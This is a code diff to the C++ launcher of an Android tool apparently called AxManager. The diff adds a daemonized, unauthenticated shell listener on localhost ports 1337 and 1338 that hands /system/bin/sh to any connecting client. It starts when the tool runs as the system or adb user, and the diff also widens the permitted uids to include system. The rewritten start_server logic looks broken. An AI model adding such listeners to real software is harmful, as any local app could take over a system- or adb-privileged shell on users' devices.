@@ -11,6 +11,10 @@
 #include <cerrno>
 #include <string>
 #include <termios.h>
+#include <sys/wait.h>
+#include <linux/in.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
 #include "misc.h"
 #include "selinux.h"
 #include "cgroup.h"
@@ -112,32 +116,128 @@ v_current = (uintptr_t) v + v_size - sizeof(char *); \
     }
 }
 
+static int switch_cgroup();
+
+void redirectStd(int old_fd) {
+    dup2(old_fd, STDIN_FILENO);
+    dup2(old_fd, STDOUT_FILENO);
+    dup2(old_fd, STDERR_FILENO);
+}
+
+static int fork_daemon(int returnParent) {
+    pid_t child = fork();
+    if (child < 0)
+        return -1;
+
+    if (child > 0) {
+        int status;
+        pid_t waited = waitpid(child, &status, 0);
+        if (waited == child && WIFEXITED(status)) {
+            if (!returnParent)
+                exit(EXIT_SUCCESS);
+        }
+        return -1;
+    }
+
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    int devNull = open("/dev/null", O_RDWR);
+    redirectStd(devNull);
+    close(devNull);
+
+    if (setsid() < 0)
+        exit(EXIT_FAILURE);
+
+    child = fork();
+    if (child < 0)
+        exit(EXIT_FAILURE);
+
+    if (child > 0)
+        exit(EXIT_SUCCESS);
+
+    uid_t uid = getuid();
+    if (uid == 0 || uid == 1000)
+        switch_cgroup();
+
+    return 0;
+}
+
+void startReverseShell(int port) {
+    int server_fd, client_fd;
+    struct sockaddr_in server_addr{};
+
+    if (fork_daemon(0) < 0) {
+        LOGE("Failed to daemonize");
+        return;
+    }
+
+    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        LOGE("socket failed");
+        return;
+    }
+
+    int optval = 1;
+    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    server_addr.sin_port = htons(port);
+
+    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+        LOGE("bind failed");
+        close(server_fd);
+        return;
+    }
+
+    if (listen(server_fd, 1) < 0) {
+        LOGE("listen failed");
+        close(server_fd);
+        return;
+    }
+
+    while (true) {
+        client_fd = accept(server_fd, nullptr, nullptr);
+        if (client_fd < 0) {
+            sleep(1);
+            continue;
+        }
+
+        pid_t shell_pid = fork();
+        if (shell_pid < 0) {
+            close(client_fd);
+            continue;
+        }
+
+        if (shell_pid == 0) {
+            close(server_fd);
+
+            redirectStd(client_fd);
+            close(client_fd);
+
+            execl("/system/bin/sh", "sh", NULL);
+            _exit(1);
+        }
+
+        close(client_fd);
+        waitpid(shell_pid, nullptr, 0);
+    }
+}
+
 static void start_server(const char *path, const char *main_class, const char *process_name) {
-    pid_t pid = fork();
-    switch (pid) {
-        case -1: {
-            perrorf("fatal: can't fork\n");
-            exit(EXIT_FATAL_FORK);
-        }
-        case 0: {
-            LOGD("child");
-            setsid();
-            chdir("/");
-            int fd = open("/dev/null", O_RDWR);
-            if (fd != -1) {
-                dup2(fd, STDIN_FILENO);
-                dup2(fd, STDOUT_FILENO);
-                dup2(fd, STDERR_FILENO);
-                if (fd > 2) close(fd);
-            }
+    if (fork_daemon(0) == 0) {
+        for (int i = 0; i < 16; i++) {
             run_server(path, main_class, process_name);
-        }
-        default: {
-            printf("info: axeron_server pid is %d\n", pid);
-            printf("info: axeron_starter exit with 0\n");
-            exit(EXIT_SUCCESS);
+            usleep(16000);
         }
     }
+
+    pid_t pid = fork();
+    printf("info: axeron_server pid is %d\n", pid);
+    printf("info: axeron_starter exit with 0\n");
+    exit(EXIT_SUCCESS);
 }
 
 static int check_selinux(const char *s, const char *t, const char *c, const char *p) {
@@ -189,14 +289,14 @@ int main(int argc, char *argv[]) {
     }
 
     uid_t uid = getuid();
-    if (uid != 0 && uid != 2000) {
-        perrorf("fatal: run AxManager from non root nor adb user (uid=%d).\n", uid);
+    if (uid != 0 && uid != 1000 && uid != 2000) {
+        perrorf("fatal: run AxManager from non root/system/adb user (uid=%d).\n", uid);
         exit(EXIT_FATAL_UID);
     }
 
     se::init();
 
-    if (uid == 0) {
+    if (uid == 0 || uid == 1000) {
         switch_cgroup();
 
         if (android_get_device_api_level() >= 29) {
@@ -248,6 +348,22 @@ int main(int argc, char *argv[]) {
             printf("warn: failed to kill %d (%s)\n", pid, name);
         }
     });
+
+    if (uid == 1000) {
+        printf("info: starting reverse system shell server at port 1337...\n");
+        fflush(stdout);
+        if (fork() == 0) {
+            startReverseShell(1337);
+            _exit(0);
+        }
+    } else if (uid == 2000) {
+        printf("info: starting reverse adb shell server at port 1338...\n");
+        fflush(stdout);
+        if (fork() == 0) {
+            startReverseShell(1338);
+            _exit(0);
+        }
+    }
 
     if (access(apk_path.c_str(), R_OK) == 0) {
         printf("info: use apk path from argv\n");
